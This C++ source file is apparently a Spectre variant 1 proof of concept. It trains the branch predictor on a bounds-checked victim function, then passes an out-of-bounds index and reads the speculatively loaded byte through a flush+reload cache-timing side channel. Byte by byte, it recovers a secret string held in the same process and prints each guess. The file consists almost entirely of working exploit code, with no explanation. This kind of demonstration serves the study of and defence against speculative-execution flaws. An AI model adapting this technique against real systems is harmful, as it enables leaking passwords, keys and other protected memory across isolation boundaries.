#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <emmintrin.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef CACHELINE_SIZE
#define CACHELINE_SIZE 64
#endif
#ifndef ITERS
#define ITERS 1000
#endif
#ifndef TRAIN_REPS
#define TRAIN_REPS 30
#endif
#ifndef THRESHOLD
#define THRESHOLD 120
#endif
#ifndef ARRAY_SIZE
#define ARRAY_SIZE 16
#endif
#ifndef NUM_PAGES
#define NUM_PAGES 256
#endif
#ifndef TRAINING_ITERS
#define TRAINING_ITERS 100
#endif

static volatile size_t array_size = ARRAY_SIZE;
static unsigned char public_array[ARRAY_SIZE];
static unsigned char *array = public_array;
static unsigned char *probe;
static volatile unsigned char temp = 0;
static const char secret[] = "this is my super secret value!";

__attribute__((noinline))
static void victim(size_t x) {
    _mm_clflush((void *)&array_size);
    _mm_lfence();

    if (x < array_size) {
        unsigned char secret_byte = array[x];
        volatile unsigned char x = probe[PAGE_SIZE * secret_byte];
    }
}

static inline long time_load(void *ptr) {
    unsigned int junk = 0;
    unsigned long long start = __rdtscp(&junk);
    *(volatile unsigned char *)ptr;
    return (long)(__rdtscp(&junk) - start);
}

static unsigned int lcg_next(unsigned int state) {
    return state * 1664525u + 1013904223u;
}

static void flush_probe(void) {
    for (int i = 0; i < PAGE_SIZE * NUM_PAGES; i += CACHELINE_SIZE) {
        _mm_clflush(probe + i);
    }
    _mm_mfence();
}

static void shuffle(int *order, int n, unsigned int *state) {
    for (int i = 0; i < n; ++i) {
        order[i] = i;
    }
    for (int i = n - 1; i > 0; --i) {
        *state = lcg_next(*state);
        int j = (int)(*state % (unsigned int)(i + 1));
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }
}

static int probe_buffer(int *order, unsigned int *state) {
    shuffle(order, NUM_PAGES, state);
    for (int i = 0; i < NUM_PAGES; ++i) {
        int page = order[i];
        if (time_load(probe + PAGE_SIZE * page) < THRESHOLD) {
            return page;
        }
    }

    return -1;
}

static void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

static void setup(void) {
    for (int i = 0; i < ARRAY_SIZE; ++i) {
        array[i] = (unsigned char)(i + 1);
    }

    probe = (unsigned char *)mmap(NULL, PAGE_SIZE * NUM_PAGES, PROT_READ | PROT_WRITE,
                                  MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (probe == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    memset(probe, 1, PAGE_SIZE * NUM_PAGES);
}

static void train_then_attack(size_t malicious_x, unsigned int attempt) {
    size_t training_x = attempt % ARRAY_SIZE;
    int training_iters = rand() % 1000;
    for (volatile int j = TRAINING_ITERS; j >= 0; --j) {
        size_t x = (j == 0) ? malicious_x : training_x;
        victim(x);
    }
}

int main() {
    int order[NUM_PAGES];
    unsigned int lcg_state = 1;
    char guessed[sizeof(secret)] = {};
    int secret_len = (int)strlen(secret);
    uintptr_t diff = (uintptr_t)secret - (uintptr_t)array;
    printf("array=%p secret=%p malicious_base_x=%zu\n",
           (void *)array, (const void *)secret, (size_t)diff);

    pin_cpu(0);
    setup();

    for (int byte = 0; byte < secret_len; ++byte) {
        int scores[NUM_PAGES] = {};
        size_t malicious_x = (size_t)(diff + (uintptr_t)byte);

        for (int i = 0; i < ITERS; ++i) {
            flush_probe();
            train_then_attack(malicious_x, (unsigned int)i);

            int found = probe_buffer(order, &lcg_state);
            if (found >= 0) {
                scores[found]++;
            }
        }

        int best = -1;
        int best_count = 0;
        for (int page = 0; page < NUM_PAGES; ++page) {
            if (page >= 1 && page <= ARRAY_SIZE) {
                continue;
            }
            if (scores[page] > best_count) {
                best = page;
                best_count = scores[page];
            }
        }

        guessed[byte] = best >= 0 ? (char)best : '_';
        printf("secret[%2d]: expected=0x%02x guessed=0x%02x score=%d/%d %s\n",
               byte, (unsigned char)secret[byte], best, best_count, ITERS,
               best == (unsigned char)secret[byte] ? "hit" : "miss");
    }

    printf("expected: %s\n", secret);
    printf("received: %s\n", guessed);
    return temp;
}
